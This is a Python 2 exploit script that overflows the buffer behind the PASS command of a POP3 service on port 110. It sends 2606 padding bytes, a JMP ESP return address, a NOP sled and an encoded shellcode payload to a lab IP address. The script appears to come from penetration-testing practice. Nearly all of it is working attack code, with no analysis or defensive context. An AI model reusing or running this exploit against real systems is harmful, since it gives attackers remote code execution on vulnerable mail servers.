#!/usr/bin/python
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

shellcode = ("\xbe\xc6\xe8\xb6\x89\xda\xc7\xd9\x74\x24\xf4\x5a\x2b\xc9\xb1"
"\x52\x83\xea\xfc\x31\x72\x0e\x03\xb4\xe6\x54\x7c\xc4\x1f\x1a"
"\x7f\x34\xe0\x7b\x09\xd1\xd1\xbb\x6d\x92\x42\x0c\xe5\xf6\x6e"
"\xe7\xab\xe2\xe5\x85\x63\x05\x4d\x23\x52\x28\x4e\x18\xa6\x2b"
"\xcc\x63\xfb\x8b\xed\xab\x0e\xca\x2a\xd1\xe3\x9e\xe3\x9d\x56"
"\x0e\x87\xe8\x6a\xa5\xdb\xfd\xea\x5a\xab\xfc\xdb\xcd\xa7\xa6"
"\xfb\xec\x64\xd3\xb5\xf6\x69\xde\x0c\x8d\x5a\x94\x8e\x47\x93"
"\x55\x3c\xa6\x1b\xa4\x3c\xef\x9c\x57\x4b\x19\xdf\xea\x4c\xde"
"\x9d\x30\xd8\xc4\x06\xb2\x7a\x20\xb6\x17\x1c\xa3\xb4\xdc\x6a"
"\xeb\xd8\xe3\xbf\x80\xe5\x68\x3e\x46\x6c\x2a\x65\x42\x34\xe8"
"\x04\xd3\x90\x5f\x38\x03\x7b\x3f\x9c\x48\x96\x54\xad\x13\xff"
"\x99\x9c\xab\xff\xb5\x97\xd8\xcd\x1a\x0c\x76\x7e\xd2\x8a\x81"
"\x81\xc9\x6b\x1d\x7c\xf2\x8b\x34\xbb\xa6\xdb\x2e\x6a\xc7\xb7"
"\xae\x93\x12\x17\xfe\x3b\xcd\xd8\xae\xfb\xbd\xb0\xa4\xf3\xe2"
"\xa1\xc7\xd9\x8a\x48\x32\x8a\x74\x24\x74\xc3\x1d\x37\x84\xd2"
"\x66\xbe\x62\xbe\x88\x97\x3d\x57\x30\xb2\xb5\xc6\xbd\x68\xb0"
"\xc9\x36\x9f\x45\x87\xbe\xea\x55\x70\x4f\xa1\x07\xd7\x50\x1f"
"\x2f\xbb\xc3\xc4\xaf\xb2\xff\x52\xf8\x93\xce\xaa\x6c\x0e\x68"
"\x05\x92\xd3\xec\x6e\x16\x08\xcd\x71\x97\xdd\x69\x56\x87\x1b"
"\x71\xd2\xf3\xf3\x24\x8c\xad\xb5\x9e\x7e\x07\x6c\x4c\x29\xcf"
"\xe9\xbe\xea\x89\xf5\xea\x9c\x75\x47\x43\xd9\x8a\x68\x03\xed"
"\xf3\x94\xb3\x12\x2e\x1d\xc3\x58\x72\x34\x4c\x05\xe7\x04\x11"
"\xb6\xd2\x4b\x2c\x35\xd6\x33\xcb\x25\x93\x36\x97\xe1\x48\x4b"
"\x88\x87\x6e\xf8\xa9\x8d")


#2606 for our offset, "\x8f\x35\x4a\x5f" for JMP ESP, enough NOPS to account for slack, shellcode, lastly our C's

buffer = "A"*2606 + "\x8f\x35\x4a\x5f" + "\x90"*16 + shellcode

try:
	print "\nSending evil buffer..."
	s.connect(('192.168.72.133',110))
	data = s.recv(1024)
	s.send('USER Anowar' + '\r\n')
	data = s.recv(1024)
	s.send('PASS ' + buffer + '\r\n')
	print "\nDone!,"
except:
	print "Could not connect"